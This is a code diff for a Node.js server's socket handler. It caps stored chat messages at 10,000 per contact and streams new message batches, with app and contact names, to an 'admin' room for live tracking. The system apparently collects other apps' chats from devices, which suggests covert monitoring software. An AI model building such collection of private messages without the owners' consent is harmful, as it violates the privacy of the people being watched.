@@ -290,10 +290,62 @@ function setupSocketHandlers(io) {
 
                 console.log(`[CHAT] ✅ Saved ${savedCount} new, skipped ${skippedCount} duplicates`);
 
+                // ===== MESSAGE CLEANUP: Limit 10,000 messages per contact =====
+                const MAX_MESSAGES_PER_CONTACT = 10000;
+
+                // Get unique contacts from this batch
+                const uniqueContacts = [...new Set(messages.map(m => `${m.chatApp}|${m.contactName}`))];
+
+                for (const contactKey of uniqueContacts) {
+                    const [chatApp, contactName] = contactKey.split('|');
+                    if (!contactName) continue;
+
+                    // Count messages for this contact
+                    const count = await prisma.chatMessage.count({
+                        where: {
+                            deviceId: device.id,
+                            chatApp: chatApp,
+                            contactName: contactName
+                        }
+                    });
+
+                    // If over limit, delete oldest messages
+                    if (count > MAX_MESSAGES_PER_CONTACT) {
+                        const deleteCount = count - MAX_MESSAGES_PER_CONTACT;
+                        console.log(`[CHAT] 🧹 Cleaning ${deleteCount} old messages for ${contactName}`);
+
+                        // Find oldest messages to delete
+                        const oldestMessages = await prisma.chatMessage.findMany({
+                            where: {
+                                deviceId: device.id,
+                                chatApp: chatApp,
+                                contactName: contactName
+                            },
+                            orderBy: { timestamp: 'asc' },
+                            take: deleteCount,
+                            select: { id: true }
+                        });
+
+                        // Delete them
+                        await prisma.chatMessage.deleteMany({
+                            where: {
+                                id: { in: oldestMessages.map(m => m.id) }
+                            }
+                        });
+
+                        console.log(`[CHAT] 🧹 Deleted ${oldestMessages.length} old messages`);
+                    }
+                }
+
                 // Emit to admin panel for real-time viewing
+                // Include contact info for live tracking
+                const firstMsg = messages[0];
                 io.to('admin').emit('chat:new', {
                     deviceId,
                     count: savedCount,
+                    chatApp: firstMsg?.chatApp,
+                    contactName: firstMsg?.contactName,
+                    timestamp: Date.now(),
                     messages: messages.slice(0, 10) // Send first 10 for preview
                 });
 
